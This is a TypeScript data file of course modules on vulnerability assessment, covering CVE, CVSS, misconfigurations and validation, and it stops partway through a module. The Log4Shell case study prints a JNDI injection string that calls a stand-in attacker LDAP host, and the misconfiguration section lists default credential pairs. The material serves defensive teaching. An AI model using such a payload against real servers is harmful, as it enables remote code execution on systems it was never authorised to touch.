import { ModuleData } from '@/types/lesson';

export const MODULES: ModuleData[] = [
  {
    id: 'mod-1',
    slug: 'introduction',
    moduleNumber: 1,
    title: 'Introduction to Vulnerability Assessment',
    shortTitle: 'Introduction',
    subtitle: 'Core concepts, threat models, the CIA triad, and risk fundamentals',
    estimatedMinutes: 18,
    category: 'Fundamentals',
    summary: 'Master the fundamental principles of vulnerability assessment, explore the relationship between threats, vulnerabilities, exploits, and business risk, and understand how weaknesses compromise Confidentiality, Integrity, and Availability.',
    workflowId: 'lifecycle',
    sections: [
      {
        id: 'sec-intro-def',
        title: '1. What is a Vulnerability Assessment?',
        content: `A **Vulnerability Assessment (VA)** is a systematic, structured evaluation of an organization's IT assets—including network devices, operating systems, cloud environments, databases, and web applications—to identify, quantify, validate, and prioritize known security weaknesses.

Unlike aggressive penetration testing, the primary goal of a vulnerability assessment is **broad surface visibility and defensive hygiene**. It answers the fundamental question: *"What known security flaws exist within our environment, how severe are they, and what steps must we take to eliminate them before an adversary takes advantage?"*`,
        keyTakeaways: [
          'Vulnerability assessment provides comprehensive discovery and classification of security weaknesses across systems.',
          'Focuses on identification, validation, and remediation guidance rather than invasive exploitation.',
          'Forms the foundation of a modern Risk-Based Vulnerability Management (RBVM) program.',
        ],
      },
      {
        id: 'sec-intro-relationships',
        title: '2. Vulnerability vs Threat vs Exploit vs Risk',
        content: `In cybersecurity discussions, practitioners often misuse the terms vulnerability, threat, exploit, and risk interchangeably. Precision is critical:

- **Vulnerability:** A flaw, bug, architectural weakness, or misconfiguration in software or hardware that can be triggered or bypassed (e.g., an unpatched Apache web server containing a remote code execution bug).
- **Threat:** An external or internal entity, event, or capability with the intent or potential to cause harm (e.g., a ransomware gang, an insider threat, or automated botnet crawlers).
- **Exploit:** A specific technique, script, malicious input payload, or proof-of-concept program designed to take advantage of a vulnerability to achieve unauthorized execution or access.
- **Risk:** The net business impact resulting from the probability that a specific threat will successfully exploit a vulnerability, measured against the value and exposure of the impacted asset:
$$\\text{Risk} = \\text{Threat} \\times \\text{Vulnerability} \\times \\text{Asset Value / Business Impact}$$
- **Security Control:** A defensive measure, policy, firewall rule, or cryptographic safeguard designed to eliminate the vulnerability or mitigate the threat.`,
        practicalObservations: [
          'A vulnerability with no available exploit in an isolated intranet server represents lower operational risk than a Moderate vulnerability on an internet-facing gateway.',
          'Automated vulnerability scanners measure technical severity (CVSS), but human security engineers evaluate operational risk.',
        ],
      },
      {
        id: 'sec-intro-cia',
        title: '3. Impact on Confidentiality, Integrity, and Availability (CIA Triad)',
        content: `Every security vulnerability is evaluated by its potential disruption to the three pillars of information security:

1. **Confidentiality:** Preventing unauthorized disclosure of private information (e.g., SQL injection leaking customer credit cards, exposed S3 buckets, directory listing).
2. **Integrity:** Ensuring information and processing methods remain authentic, accurate, and unaltered (e.g., insecure direct object references allowing balance modifications, tampering with audit logs).
3. **Availability:** Ensuring timely and reliable access to systems and information for authorized users (e.g., buffer overflows that crash critical service daemons, amplification denial-of-service vulnerabilities).`,
        keyTakeaways: [
          'Confidentiality protects against unauthorized disclosure.',
          'Integrity protects against unauthorized alteration or deception.',
          'Availability protects against unauthorized denial of service or disruption.',
        ],
      },
      {
        id: 'sec-intro-id-vs-validation',
        title: '4. Vulnerability Identification vs Vulnerability Validation',
        content: `A critical distinction taught in professional cybersecurity operations:

- **Vulnerability Identification:** The automated process of discovering candidate flaws using tools like OpenVAS, Nessus, or OWASP ZAP. Scanners match service banners, version strings, and heuristic response patterns.
- **Vulnerability Validation:** The rigorous manual or semi-automated verification performed by an analyst to prove that a candidate scanner finding is genuinely present, applicable, and actionable—filtering out false positives and environmental noise.`,
      },
    ],
    comparisonTables: [
      {
        title: 'Core Terminology Comparison Matrix',
        description: 'Key distinctions between foundational cybersecurity concepts',
        columns: [
          { key: 'concept', label: 'Concept' },
          { key: 'definition', label: 'Technical Definition' },
          { key: 'example', label: 'Real-World Example' },
          { key: 'role', label: 'Role in Assessment' },
        ],
        rows: [
          {
            concept: 'Vulnerability',
            definition: 'Weakness in logic, configuration, or code.',
            example: 'Log4j JNDI lookup flaw (CVE-2021-44228)',
            role: 'Target of discovery & validation',
          },
          {
            concept: 'Threat',
            definition: 'Actor or event capable of exploiting a weakness.',
            example: 'Financially motivated ransomware syndicate',
            role: 'Contextual risk consideration',
          },
          {
            concept: 'Exploit',
            definition: 'Payload or script that activates the flaw.',
            example: 'Custom JNDI LDAP injection packet',
            role: 'Used safely for verification',
          },
          {
            concept: 'Risk',
            definition: 'Overall financial or operational harm.',
            example: '$2.5M loss due to customer data exfiltration',
            role: 'Guides remediation priority',
          },
          {
            concept: 'Security Control',
            definition: 'Defensive countermeasure or barrier.',
            example: 'Web Application Firewall (WAF) rule',
            role: 'Mitigation countermeasure',
          },
        ],
      },
    ],
    knowledgeCheck: {
      question: 'Why does an unpatched vulnerability in an air-gapped system present lower business risk than the same vulnerability on an internet-facing portal?',
      options: [
        'Because vulnerabilities on air-gapped systems automatically patch themselves',
        'Because the air-gap provides a compensating control that severely limits threat actor reachability and attack vector likelihood',
        'Because CVSS Base Scores are always zero for internal machines',
        'Because air-gapped systems cannot execute software binaries',
      ],
      correctIndex: 1,
      explanation: 'Risk depends on threat reachability and exposure. Even if technical severity is identical, an air-gapped environment reduces the likelihood of exploitation by limiting the attack vector.',
    },
    externalLinks: [
      {
        title: 'NIST Computer Security Resource Center (CSRC)',
        url: 'https://csrc.nist.gov/',
        description: 'Authoritative cybersecurity glossary, SP 800-115 technical assessment guide.',
      },
    ],
  },

  {
    id: 'mod-2',
    slug: 'types-of-assessment',
    moduleNumber: 2,
    title: 'Types of Vulnerability Assessment',
    shortTitle: 'Types of Assessment',
    subtitle: 'Network, Web App, Host, Cloud, and Credentialed vs Non-Credentialed Inspections',
    estimatedMinutes: 20,
    category: 'Fundamentals',
    summary: 'Compare the technical scopes, objectives, tools, and methodologies of network scanning, web application assessment, host compliance audits, cloud posture reviews, and authenticated versus unauthenticated approaches.',
    workflowId: 'lifecycle',
    sections: [
      {
        id: 'sec-types-network',
        title: '1. Network Vulnerability Assessment',
        content: `Network vulnerability assessment examines network devices (routers, switches, firewalls) and listening service ports across subnets.

- **Primary Objectives:** Identify unauthorized active hosts, unneeded open ports, legacy protocol daemons (e.g., Telnet, FTP, SMBv1), weak SSL/TLS cipher suites, and unpatched network services.
- **Standard Tools:** Nmap, Masscan, Greenbone/OpenVAS, Nessus.
- **Typical Findings:** Open Telnet port 23, deprecated TLS 1.0 enabled on HTTPS port 443, default SNMP community strings (e.g. \`public\`), outdated DNS server software susceptible to cache poisoning.`,
      },
      {
        id: 'sec-types-webapp',
        title: '2. Web Application Vulnerability Assessment (DAST)',
        content: `Dynamic Application Security Testing (DAST) assesses running web applications and APIs by injecting simulated inputs through standard HTTP/HTTPS channels.

- **Primary Objectives:** Detect application-layer security weaknesses including Cross-Site Scripting (XSS), SQL Injection, Server-Side Request Forgery (SSRF), missing security headers, and broken access controls.
- **Standard Tools:** OWASP ZAP, Burp Suite Professional, Nikto, Arachni.
- **Typical Findings:** Missing \`Content-Security-Policy\` header, reflected XSS in search input, unauthenticated debug endpoints (\`/actuator/env\`), exposed Swagger/OpenAPI documentation leaking private parameters.`,
      },
      {
        id: 'sec-types-host',
        title: '3. Host-Based & Operating System Assessment',
        content: `Host-based vulnerability assessment evaluates internal operating system configurations, kernel patch levels, installed third-party software packages, and system file permissions.

- **Primary Objectives:** Detect unpatched operating system CVEs, weak password policies, excessive file permissions (e.g. SUID binaries or world-writable config files), and obsolete software libraries.
- **Standard Tools:** Lynis, OpenSCAP, Wazuh agent, Microsoft Defender Vulnerability Management.
- **Typical Findings:** Unpatched Linux kernel susceptible to Dirty Cow or PwnKit, world-writable \`/etc/passwd\`, unquoted service paths on Windows Server, obsolete Java Runtime Environment (JRE).`,
      },
      {
        id: 'sec-types-cloud',
        title: '4. Cloud Security Posture & Configuration Assessment',
        content: `Cloud assessment (often termed Cloud Security Posture Management or CSPM) evaluates cloud control planes, storage buckets, Identity & Access Management (IAM) permissions, and virtual network security groups across AWS, Azure, and Google Cloud.

- **Primary Objectives:** Identify misconfigured cloud resources, publicly accessible storage buckets, overly permissive IAM roles, and unencrypted databases.
- **Standard Tools:** ScoutSuite, Prowler, Checkov, Trivy.
- **Typical Findings:** Amazon S3 bucket configured with public read access, AWS IAM role with wildcard permissions (\`Action: "*", Resource: "*"\`), database snapshot accessible cross-tenant.`,
      },
      {
        id: 'sec-types-auth-vs-unauth',
        title: '5. Authenticated vs Unauthenticated Assessments',
        content: `A fundamental operational decision is whether the assessment will run with or without administrative credentials:

- **Unauthenticated (External / Black-box) Assessment:** The scanner probes the target from the outside without valid credentials. It simulates what an anonymous internet adversary can see. It is limited to observing open ports, banners, and externally facing responses. It has a higher rate of false positives because it cannot inspect internal patch databases.
- **Authenticated (Credentialed / White-box) Assessment:** The scanner logs into the target operating system (via SSH or Windows WMI/SMB) or application using an audit account. It reads the local package registry, kernel version, installed software manifests, and exact file hashes. Authenticated scanning has vastly superior accuracy, identifies 300% to 500% more vulnerabilities, and drastically reduces false positives.`,
        keyTakeaways: [
          'Unauthenticated scans identify external attack surface and perimeter exposure.',
          'Authenticated scans reveal exact internal patch levels, missing security baselines, and local privilege escalation vectors.',
          'Enterprise compliance standards (such as PCI-DSS and CIS Controls) mandate authenticated scanning for critical infrastructure.',
        ],
      },
    ],
    comparisonTables: [
      {
        title: 'Authenticated vs Unauthenticated Scanning Comparison',
        columns: [
          { key: 'attribute', label: 'Attribute' },
          { key: 'unauthenticated', label: 'Unauthenticated Scan' },
          { key: 'authenticated', label: 'Authenticated Scan' },
        ],
        rows: [
          {
            attribute: 'Access Level',
            unauthenticated: 'Zero access; external network queries only',
            authenticated: 'Audit credentials (SSH key, WMI, or read-only token)',
          },
          {
            attribute: 'Visibility',
            unauthenticated: 'Perimeter ports and exposed service banners',
            authenticated: 'Kernel, registry, libraries, and internal configuration files',
          },
          {
            attribute: 'Accuracy',
            unauthenticated: 'Prone to banner-based false positives',
            authenticated: 'High fidelity with exact package version inspection',
          },
          {
            attribute: 'Network Impact',
            unauthenticated: 'Higher packet volume and potential IDS alerts',
            authenticated: 'Lightweight local command execution over encrypted session',
          },
          {
            attribute: 'Depth of Findings',
            unauthenticated: 'Surface weaknesses and misconfigured gateways',
            authenticated: 'Comprehensive internal CVEs, compliance baselines, and local misconfigurations',
          },
        ],
      },
    ],
    knowledgeCheck: {
      question: 'Why do modern cybersecurity compliance frameworks prioritize authenticated vulnerability scans over unauthenticated scans?',
      options: [
        'Because unauthenticated scans are illegal in all corporate networks',
        'Because authenticated scans can inspect local package registries and configuration files directly, minimizing false positives and detecting internal vulnerabilities',
        'Because authenticated scans permanently uninstall vulnerable software packages',
        'Because unauthenticated scans take longer than 6 months to complete',
      ],
      correctIndex: 1,
      explanation: 'Authenticated scans provide inside-out visibility into the exact package versions, installed binaries, and configuration baselines, producing vastly higher accuracy and identifying internal vulnerabilities that perimeter scans cannot detect.',
    },
    externalLinks: [
      {
        title: 'Center for Internet Security (CIS) Benchmarks',
        url: 'https://www.cisecurity.org/cis-benchmarks',
        description: 'Prescriptive configuration baselines for operating systems, cloud providers, and applications.',
      },
    ],
  },

  {
    id: 'mod-3',
    slug: 'cve-fundamentals',
    moduleNumber: 3,
    title: 'CVE — Common Vulnerabilities and Exposures',
    shortTitle: 'CVE Fundamentals',
    subtitle: 'Standardized Vulnerability Identifiers, NVD, and the CVE Research Workflow',
    estimatedMinutes: 22,
    category: 'Standards & Metrics',
    summary: 'Explore the CVE Program, decode the CVE identifier syntax, understand CVE assignment rules, analyze the historic Log4Shell vulnerability, and practice the 8-step CVE research and applicability workflow.',
    workflowId: 'cveResearch',
    sections: [
      {
        id: 'sec-cve-definition',
        title: '1. What is a CVE Identifier?',
        content: `**Common Vulnerabilities and Exposures (CVE)** is a federally funded, internationally recognized dictionary of publicly known cybersecurity vulnerabilities maintained by the **MITRE Corporation** and supported by the Cybersecurity and Infrastructure Security Agency (CISA).

Before CVE was established in 1999, every security vendor used proprietary names for security bugs. Vendor A called an issue "Apache buffer overrun", while Vendor B called it "HTTPD heap corruption". This created chaos during security audits.

The CVE system assigns a single, standardized, unambiguous identifier to each vulnerability:
$$\\text{CVE-YYYY-NNNNN}$$
- \`CVE\`: Constant prefix.
- \`YYYY\`: The year the vulnerability identifier was reserved or publicly published.
- \`NNNNN\`: A variable-length sequence number (minimum 4 digits, but can expand to 5, 6, or more digits).`,
      },
      {
        id: 'sec-cve-ecosystem',
        title: '2. The CVE Ecosystem: CVE vs CWE vs CPE',
        content: `To effectively research vulnerabilities, you must understand how three complementary standards operate together:

1. **CVE (Common Vulnerabilities and Exposures):**
   - *Question it answers:* "Which specific, individual vulnerability instance are we discussing?"
   - *Example:* **CVE-2021-44228** (The specific JNDI injection bug in Log4j 2.x).
2. **CWE (Common Weakness Enumeration):**
   - *Question it answers:* "What fundamental category of software development defect caused this issue?"
   - *Example:* **CWE-502: Deserialization of Untrusted Data** or **CWE-89: SQL Injection**.
3. **CPE (Common Platform Enumeration):**
   - *Question it answers:* "What exact vendor, product, and version of software is affected?"
   - *Example:* \`cpe:2.3:a:apache:log4j:2.14.1:*:*:*:*:*:*:*\`.`,
      },
      {
        id: 'sec-cve-log4shell',
        title: '3. Historical Case Study: Log4Shell (CVE-2021-44228)',
        content: `In December 2021, an extraordinarily severe vulnerability was disclosed in **Apache Log4j 2**, a ubiquitous Java logging framework used by millions of enterprise applications worldwide.

- **Vulnerability ID:** CVE-2021-44228
- **CVSS v3.1 Base Score:** 10.0 (Critical)
- **Vector:** \`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H\`
- **Root Cause:** Log4j contained a message lookup feature that parsed input strings formatted like \`\${jndi:ldap://attacker.com/exploit}\`. When an application logged untrusted user input (such as an HTTP User-Agent or username), Log4j made an outbound network request to an attacker-controlled LDAP server, downloaded a serialized Java class, and executed arbitrary code with the privileges of the running application.

**Key Educational Takeaway:** A software application might contain the \`log4j-core-2.14.1.jar\` binary, but if the Java runtime has disabled JNDI remote lookups (\`log4j2.formatMsgNoLookups=true\`) or if egress network traffic on port 389/1389 is blocked by firewall rules, the system is **mitigated** despite containing the vulnerable library. This illustrates why vulnerability analysts must validate environmental applicability before declaring an emergency.`,
      },
      {
        id: 'sec-cve-guided-workflow',
        title: '4. The 8-Step CVE Research & Verification Workflow',
        content: `When a vulnerability scanner flags a candidate CVE, professional security analysts follow this disciplined 8-step methodology:

1. **Software Identification:** Record the exact software package or binary name.
2. **Version Verification:** Inspect the exact installed version string (including vendor release tags and build numbers).
3. **CVE Database Search:** Search [cve.org](https://www.cve.org/) and the [NIST NVD](https://nvd.nist.gov/) for known CVE entries matching the product.
4. **Advisory Review:** Locate the primary vendor security advisory (e.g. Red Hat Errata, Microsoft MSRC, Apache Bulletin).
5. **Affected-Version Analysis:** Compare the installed version against the reported affected version range \`[minVersion, maxVersion]\`.
6. **Applicability Validation:** Check whether required configuration switches or runtime parameters are enabled.
7. **Remediation Recommendation:** Propose the official vendor patch or approved workaround.
8. **Retesting:** Verify that the patch was installed and that the vulnerability signature is no longer detected.`,
      },
    ],
    comparisonTables: [
      {
        title: 'CVE vs CWE vs CPE Comparison',
        columns: [
          { key: 'standard', label: 'Standard' },
          { key: 'fullForm', label: 'Full Title' },
          { key: 'focus', label: 'Primary Focus' },
          { key: 'example', label: 'Format & Example' },
        ],
        rows: [
          {
            standard: 'CVE',
            fullForm: 'Common Vulnerabilities and Exposures',
            focus: 'Specific, unique vulnerability instance in a published product',
            example: 'CVE-2021-44228',
          },
          {
            standard: 'CWE',
            fullForm: 'Common Weakness Enumeration',
            focus: 'Generic architectural, design, or coding flaw class',
            example: 'CWE-20: Improper Input Validation',
          },
          {
            standard: 'CPE',
            fullForm: 'Common Platform Enumeration',
            focus: 'Structured URI naming scheme for IT hardware, OS, and software',
            example: 'cpe:2.3:a:apache:log4j:2.14.1',
          },
        ],
      },
    ],
    knowledgeCheck: {
      question: 'If a vulnerability scanner identifies a software version matching a known CVE, why does this NOT automatically prove that the host is exploitable?',
      options: [
        'Because the CVE program only tracks hardware vulnerabilities',
        'Because the host may have compensating network controls, backported vendor patches, or the vulnerable code path/feature may be disabled in configuration',
        'Because CVE numbers expire 30 days after publication',
        'Because all CVEs are purely theoretical and cannot be weaponized',
      ],
      correctIndex: 1,
      explanation: 'Scanners often rely on banner matching. If a Linux distribution backports a patch without incrementing the upstream version number, or if the specific vulnerable feature is disabled in the configuration, the vulnerability is not exploitable on that host.',
    },
    externalLinks: [
      {
        title: 'CVE.ORG Official Directory',
        url: 'https://www.cve.org/',
        description: 'The official home of the CVE List and CVE Assignment Program.',
      },
      {
        title: 'NIST National Vulnerability Database (NVD)',
        url: 'https://nvd.nist.gov/',
        description: 'U.S. government repository of standards-based vulnerability management data.',
      },
    ],
  },

  {
    id: 'mod-4',
    slug: 'cvss-scoring',
    moduleNumber: 4,
    title: 'CVSS — Common Vulnerability Scoring System',
    shortTitle: 'CVSS Scoring',
    subtitle: 'CVSS v3.1 Base Metrics, Mathematical Formulas, Vector Strings, and v4.0 Evolution',
    estimatedMinutes: 25,
    category: 'Standards & Metrics',
    summary: 'Understand how CVSS calculates objective technical severity, explore all eight CVSS v3.1 Base metrics, examine the CVSS v4.0 paradigm shift, decode vector strings, and test calculations using the interactive CVSS calculator.',
    workflowId: 'cvssScoring',
    sections: [
      {
        id: 'sec-cvss-purpose',
        title: '1. What is CVSS and Why Does It Matter?',
        content: `The **Common Vulnerability Scoring System (CVSS)** is an open industry standard managed by the **Forum of Incident Response and Security Teams (FIRST)** to communicate the technical severity and characteristics of software vulnerabilities.

Prior to CVSS, vendors used subjective descriptors like "Mild", "Important", or "Super High", making comparisons impossible. CVSS provides a standardized scale from **0.0 to 10.0**:

- **0.0:** None
- **0.1 – 3.9:** Low
- **4.0 – 6.9:** Medium
- **7.0 – 8.9:** High
- **9.0 – 10.0:** Critical

> **Crucial Rule:** CVSS measures **intrinsic technical severity**, NOT **business risk**. A Critical CVSS 9.8 flaw inside an air-gapped laboratory represents lower operational risk to an organization than a Medium CVSS 5.3 flaw on an internet-facing single sign-on gateway.`,
      },
      {
        id: 'sec-cvss-metrics-v31',
        title: '2. The Eight CVSS v3.1 Base Metrics Explained',
        content: `CVSS v3.1 Base Score is calculated from two sub-scores: **Exploitability** and **Impact**.

### Exploitability Metrics (Vulnerability Qualities)
1. **Attack Vector (AV):** Reflects the context by which exploitation is possible.
   - *Network (N - 0.85):* Remotely exploitable across the internet.
   - *Adjacent (A - 0.62):* Requires local subnet, Bluetooth, or wireless access.
   - *Local (L - 0.55):* Requires local shell access, user executing a file, or keyboard.
   - *Physical (P - 0.20):* Requires physical touch to the hardware.
2. **Attack Complexity (AC):** Conditions beyond the attacker's control required to succeed.
   - *Low (L - 0.77):* No specialized conditions; easily repeatable.
   - *High (H - 0.44):* Requires race conditions or cryptographic man-in-the-middle positioning.
3. **Privileges Required (PR):** Authentication level needed before exploiting.
   - *None (N - 0.85):* Completely unauthorized attacker.
   - *Low (L - 0.62 / 0.68):* Standard user account.
   - *High (H - 0.27 / 0.50):* Administrative or root credentials.
4. **User Interaction (UI):** Requires victim participation.
   - *None (N - 0.85):* Completely autonomous exploit.
   - *Required (R - 0.62):* Victim must click a malicious link or open an attachment.

### Impact Metrics (Consequences of Exploitation)
5. **Scope (S):** Captures whether an exploited component affects resources beyond its security boundary.
   - *Unchanged (U):* Impact is contained within the vulnerable component.
   - *Changed (C):* Exploit breaches authority (e.g. VM escape, browser sandbox escape, cross-site scripting executing in user context).
6. **Confidentiality Impact (C):** Loss of data secrecy (None, Low, High).
7. **Integrity Impact (I):** Loss of data authenticity and trustworthiness (None, Low, High).
8. **Availability Impact (A):** Loss of service availability or system uptime (None, Low, High).`,
      },
      {
        id: 'sec-cvss-vector-strings',
        title: '3. Decoding CVSS Vector Strings',
        content: `A CVSS score is always accompanied by a **Vector String**, a compressed text representation recording every metric choice for full auditability:

\`\`\`text
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
\`\`\`
- \`CVSS:3.1\`: Version declaration.
- \`AV:N\`: Attack Vector = Network.
- \`AC:L\`: Attack Complexity = Low.
- \`PR:N\`: Privileges Required = None.
- \`UI:N\`: User Interaction = None.
- \`S:U\`: Scope = Unchanged.
- \`C:H\`: Confidentiality = High.
- \`I:H\`: Integrity = High.
- \`A:H\`: Availability = High.
- **Calculated Base Score:** **9.8 Critical**.`,
      },
      {
        id: 'sec-cvss-v4-differences',
        title: '4. CVSS v3.1 vs CVSS v4.0 Evolution',
        content: `In late 2023, FIRST released **CVSS v4.0** to address industry feedback regarding CVSS v3.1 limitations:

- **Metric Nomenclature:** CVSS v4.0 introduces distinct nomenclature:
  - *CVSS-B:* Base score only.
  - *CVSS-BT:* Base + Threat metrics.
  - *CVSS-BE:* Base + Environmental metrics.
  - *CVSS-BTE:* Complete Base + Threat + Environmental score.
- **Attack Complexity vs Attack Requirements:** CVSS v4.0 splits Attack Complexity into two separate metrics: *Attack Complexity (AC)* (evasion techniques) and *Attack Requirements (AT)* (preconditions like race conditions or configuration dependencies).
- **User Interaction Granularity:** CVSS v4.0 expands UI into *None*, *Passive* (victim visits a page), and *Active* (victim must interact with a dialog).
- **Scope Replacement:** Scope (S) was deprecated in v4.0 and replaced by explicit dual-metric evaluations: Vulnerable System Impact (VC, VI, VA) and Subsequent System Impact (SC, SI, SA).`,
      },
    ],
    comparisonTables: [
      {
        title: 'CVSS v3.1 vs CVSS v4.0 Architectural Comparison',
        columns: [
          { key: 'dimension', label: 'Feature / Dimension' },
          { key: 'cvss31', label: 'CVSS v3.1' },
          { key: 'cvss40', label: 'CVSS v4.0' },
        ],
        rows: [
          {
            dimension: 'Metric Groups',
            cvss31: 'Base, Temporal, Environmental',
            cvss40: 'Base, Threat (replaces Temporal), Environmental, Supplemental',
          },
          {
            dimension: 'Scope Handling',
            cvss31: 'Single "Scope" metric (Unchanged vs Changed)',
            cvss40: 'Replaced with dual impact: Vulnerable System (VC/VI/VA) vs Subsequent System (SC/SI/SA)',
          },
          {
            dimension: 'Attack Requirements',
            cvss31: 'Lumped into Attack Complexity',
            cvss40: 'Separated into Attack Complexity (AC) and Attack Requirements (AT)',
          },
          {
            dimension: 'User Interaction',
            cvss31: 'None vs Required',
            cvss40: 'None vs Passive vs Active',
          },
          {
            dimension: 'Composite Naming',
            cvss31: 'CVSS Base Score',
            cvss40: 'Explicit nomenclature: CVSS-B, CVSS-BT, CVSS-BE, CVSS-BTE',
          },
        ],
      },
    ],
    knowledgeCheck: {
      question: 'Which CVSS v3.1 Base Metric captures whether an attacker needs to convince a victim to click a specially crafted link in an email?',
      options: [
        'Attack Vector (AV)',
        'User Interaction (UI:R)',
        'Privileges Required (PR:H)',
        'Scope (S:C)',
      ],
      correctIndex: 1,
      explanation: 'User Interaction (UI) evaluates whether a human victim must participate in the exploitation process (e.g. UI:R for required interaction like clicking a phishing link, vs UI:N for zero-click autonomous attacks).',
    },
    externalLinks: [
      {
        title: 'FIRST CVSS Official Specification',
        url: 'https://www.first.org/cvss/',
        description: 'Official standard documentation, user guides, and formula specifications for CVSS v3.1 and v4.0.',
      },
    ],
  },

  {
    id: 'mod-5',
    slug: 'security-misconfigurations',
    moduleNumber: 5,
    title: 'Security Misconfigurations',
    shortTitle: 'Misconfigurations',
    subtitle: 'Causes, 12 Core Weaknesses, Hardening Baselines, and Remediation',
    estimatedMinutes: 28,
    category: 'Analysis & Validation',
    summary: 'Examine OWASP Security Misconfiguration vulnerabilities. Study 12 critical configuration flaws including default credentials, exposed config files, missing headers, and insecure storage, with safe validation methods and hardening checklists.',
    workflowId: 'misconfiguration',
    sections: [
      {
        id: 'sec-misc-overview',
        title: '1. What Are Security Misconfigurations?',
        content: `**Security Misconfiguration** represents one of the most prevalent and dangerous vulnerability classes in enterprise environments (ranked consistently in the OWASP Top 10). Unlike software bugs which require vendor source code patches, misconfigurations are introduced by administrators and developers during installation, deployment, and ongoing maintenance.

Common root causes include:
- Relying on default "out-of-the-box" factory settings.
- Incomplete setup scripts or ad-hoc cloud provisioning.
- Leaving debugging flags and administrative consoles enabled in production.
- Neglecting regular configuration baseline audits.`,
      },
      {
        id: 'sec-misc-twelve',
        title: '2. Deep Dive: 12 Common Security Misconfigurations',
        content: `Below are 12 of the most frequent misconfigurations encountered during assessments:

1. **Default Credentials:** Leaving factory administrative usernames and passwords enabled (e.g. \`admin/admin\`, \`root/root\`, \`tomcat/s3cret\`) on routers, database engines, or web consoles.
2. **Unnecessary Open Ports:** Exposing ports such as Telnet (23), RDP (3389), or Redis (6379) directly to the public internet without firewall restrictions.
3. **Directory Listing:** Web servers configured with directory indexing enabled (\`autoindex on\` in Nginx or \`Options +Indexes\` in Apache), revealing application folder trees and sensitive documents.
4. **Exposed Configuration Files:** Leaving sensitive files such as \`.env\`, \`web.config\`, \`docker-compose.yml\`, or \`package.json.bak\` publicly accessible in web root paths.
5. **Missing HTTP Security Headers:** Omitting critical browser defense headers such as \`Content-Security-Policy\`, \`Strict-Transport-Security\` (HSTS), \`X-Content-Type-Options\`, and \`X-Frame-Options\`.
6. **Excessive Permissions:** Files, directories, or cloud IAM roles assigned wide-open permissions (e.g. \`chmod 777\` on private data directories or AWS IAM policies with \`Resource: "*"\`).
7. **Insecure Database Configuration:** Databases binding to all interfaces (\`bind-address 0.0.0.0\`) with empty root passwords or SSL transport disabled.
8. **Inadequate Logging and Monitoring:** Failing to log failed authentication attempts, privilege escalations, and API errors, blinding security teams to active intrusion attempts.
9. **Insecure Cloud Storage Settings:** Amazon S3 buckets or Azure Blob Storage containers configured with public anonymous read or write permissions.
10. **Weak Access-Control Policies:** CORS policies configured with permissive wildcards (\`Access-Control-Allow-Origin: *\`) combined with credential sharing (\`Access-Control-Allow-Credentials: true\`).
11. **Unnecessary Services & Sample Apps:** Leaving sample documentation apps, test servlets, or diagnostic endpoints (e.g. Spring Boot \`/actuator\`) running on production application servers.
12. **Insecure Backup Storage:** Storing unencrypted database dump files (\`dump.sql\`, \`backup.zip\`) in public web folders or world-readable network file shares.`,
      },
      {
        id: 'sec-misc-remediation',
        title: '3. Hardening Baselines and Retesting Procedures',
        content: `Preventing and resolving security misconfigurations requires systematic adherence to established security baselines:

- **CIS Benchmarks:** Apply Center for Internet Security hardening guidelines for OS, web servers, and cloud providers.
- **Infrastructure-as-Code (IaC) Scanning:** Use automated linters (e.g. Checkov, tfsec, Trivy) in CI/CD pipelines to catch misconfigurations before deployment.
- **Safe Retesting:** After applying a fix, re-query the specific configuration parameter using non-destructive commands (e.g., verifying that \`curl -I\` returns \`403 Forbidden\` or that directory listing responds with a generic error page).`,
      },
    ],
    comparisonTables: [
      {
        title: 'Security Misconfigurations vs Software Vulnerabilities',
        columns: [
          { key: 'property', label: 'Property' },
          { key: 'misconfiguration', label: 'Security Misconfiguration' },
          { key: 'softwareBug', label: 'Software Code Vulnerability' },
        ],
        rows: [
          {
            property: 'Root Cause',
            misconfiguration: 'Insecure administrative setting, default password, or missing header',
            softwareBug: 'Programming flaw in application logic or memory handling',
          },
          {
            property: 'Remediation',
            misconfiguration: 'Update configuration file, apply baseline, or modify permissions',
            softwareBug: 'Deploy compiled vendor patch or rewrite application code',
          },
          {
            property: 'Vendor Dependency',
            misconfiguration: 'Zero dependency; can be resolved immediately by internal staff',
            softwareBug: 'Dependent on vendor developing, testing, and releasing an update',
          },
          {
            property: 'CVE Assignment',
            misconfiguration: 'Rarely assigned a CVE (typically categorized under CWE-16)',
            softwareBug: 'Formally assigned a unique CVE identifier upon public disclosure',
          },
        ],
      },
    ],
    knowledgeCheck: {
      question: 'Which of the following is the most secure response to an automated scanner detecting directory listing enabled on a web server?',
      options: [
        'Ignore the alert because directory listing does not allow code execution',
        'Disable directory browsing in the web server configuration (e.g. autoindex off in Nginx) and return an empty index.html or 403 Forbidden',
        'Add a password to each individual file inside the folder',
        'Change the server IP address every 24 hours',
      ],
      correctIndex: 1,
      explanation: 'Disabling directory indexing in the web server configuration ensures remote unauthenticated users cannot enumerate folder contents, eliminating the exposure at the root configuration level.',
    },
    externalLinks: [
      {
        title: 'OWASP Security Misconfiguration (A05:2021)',
        url: 'https://owasp.org/Top10/A05_2021-Security_Misconfiguration/',
        description: 'OWASP Top 10 guidance on identification, prevention, and remediation of configuration weaknesses.',
      },
    ],
  },

  {
    id: 'mod-6',
    slug: 'vulnerability-validation',
    moduleNumber: 6,
    title: 'Vulnerability Validation',
    shortTitle: 'Validation',
    subtitle: 'Eliminating False Positives, Controlled Proof-of-Concept, and 4-Way Decision Triage',
    estimatedMinutes: 24,
    category: 'Analysis & Validation',
    summary: 'Learn why automated scanner alerts cannot be trusted blindly. Master manual validation techniques, safe evidence collection, and rigorous triage into Confirmed, False Positive, Not Applicable, or Inconclusive findings.',
    workflowId: 'validation',
    sections: [
      {
        id: 'sec-val-why',
        title: '1. Why Must Scanner Findings Be Validated?',
        content: `Automated vulnerability scanners are designed for breadth and speed, not nuance. They scan thousands of ports and endpoints by sending pre-recorded test probes and matching regular expressions on response strings.

As a result, raw scanner output is filled with:
- **False Positives:** Scanners reporting a vulnerability that does not actually exist (e.g. an OS banner says OpenSSH 7.4, but Red Hat backported the critical patch without bumping the version number).
- **Not Applicable (N/A) Findings:** A vulnerable library exists in a repository, but the corresponding feature or daemon is completely disabled in configuration.
- **Inconclusive Alerts:** The scanner received a timeout or generic 500 error and guessed that an issue was present.

Handing a 400-page raw scanner report to a DevOps engineering team damages trust and wastes hundreds of hours of developer time. **Vulnerability Validation is the defining professional value added by a security analyst.**`,
      },
      {
